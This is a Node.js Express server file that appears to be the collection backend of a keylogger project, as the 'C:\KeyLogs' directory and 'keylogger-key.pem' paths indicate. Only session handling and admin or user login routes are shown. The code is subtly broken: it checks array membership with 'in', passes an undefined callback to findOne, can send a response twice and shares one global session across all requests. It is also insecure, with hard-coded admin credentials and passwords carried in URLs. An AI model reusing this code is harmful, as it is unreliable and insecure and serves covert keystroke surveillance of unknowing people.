'use strict'

const Utils = require('./Utils');
const process = require('process');
const express = require('express');
const http = require('http');
const fs = require('fs');
const crypto = require('crypto');
const os = require('os');
const cookieParser = require('cookie-parser');
const sessions = require('express-session');
const { User } = require('./db');
const tokengen = Utils.generateToken;

let ids = new Array();
let adminAllowed = new Array();

const port = 8000;
const logDir = `C:\\KeyLogs`;
const oneDay = 1000 * 24 * 60* 60;
let session;

const adminCredentials = {
    email :    "4b5023077abd4d4bbd88e25c9db73936",
    password : "c912c45042d1f15d1ac2e91f4272557b"
}

const placeHolders = {
    email : 'c63c222c099bd96ea2672306ba98b165',
    passcode : "957b224fdd79af395d9d2222b72d6c50"
}

// let hskey = fs.readFileSync('Security-Keys/keylogger-key.pem');
// let hscert = fs.readFileSync('Security-Keys/keylogger-cert.pem');

const app = express();

fs.mkdir(logDir,(err) => {
    if(err) 
    {
        console.error(err);
    }
});

app.use(express.urlencoded({extended : true}));
app.use(cookieParser())
app.use(sessions({
    secret : tokengen(100),
    saveUninitialized : true,
    cookie : { maxAge : oneDay},
    resave : false
}));

app.get('/', (req, res) => {
    session = req.session;
    ids.push(session.id);
    res.send("OK");
});

app.get(`/addUser/${placeHolders.email}/:email/${placeHolders.passcode}/:passcode`, (req,res) => {
    let email = req.params.email;
    let passcode = req.params.passcode;
    session = req.session;
    ids.push(session.id);
    if (email === adminCredentials.email && passcode === adminCredentials.password) 
    {   adminAllowed.push(session.id);
        res.redirect('views\addUser.htm');
    }
    else
        res.send("Error: Wrong email or password");
});

app.get(`/CreateUser/`,(req,res) => {
    if(session.id in adminAllowed)
    {
        let urlInfo = new URL(req.url,`http://${req.headers.host}`);
        let email = urlInfo.searchParams.values()[0]
        let passcode = urlInfo.searchParams.values()[1]
        let user = new User({
            email : email,
            passcode : passcode,
            credentials : {
            }
        });

        user.save().then(() => {
            res.send("User created successfully")
        }).catch(() => {
            res.send("User creation unsuccessful");
        });
    }
    
    res.send("User creation is admin only");
})

app.get(`/login/${placeHolders.email}/:email/${placeHolders.passcode}/:passcode`,(req,res) => {
    if(session.id === undefined) 
        res.end('');
    if(session.id in ids){
        User.findOne({
            email : req.params.email,
            passcode : req.params.passcode
        },(err,user))
        res.send("Logged In successfully");
    } else {
        res.send("");
    }
});

app.get("*",(req,res) => {
    res.send("404 Resource Not Found");
});

app.listen(port, () => {
    console.log(`server running at https://localhost:${port}`);
});
